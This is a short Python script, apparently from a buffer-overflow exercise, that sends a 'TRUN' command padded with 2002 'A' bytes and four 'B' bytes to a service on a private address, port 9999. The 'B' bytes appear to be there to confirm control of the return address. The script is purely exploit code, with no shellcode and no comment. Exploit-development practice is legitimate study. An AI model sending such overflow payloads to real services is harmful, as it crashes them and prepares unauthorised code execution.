#!/usr/bin/python3

import socket

HOST = "192.168.1.102"
PORT = 9999

PAYLOAD = (
        b'TRUN /.../' +
        b'A' * 2002 + 
        b'B' * 4
)


with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
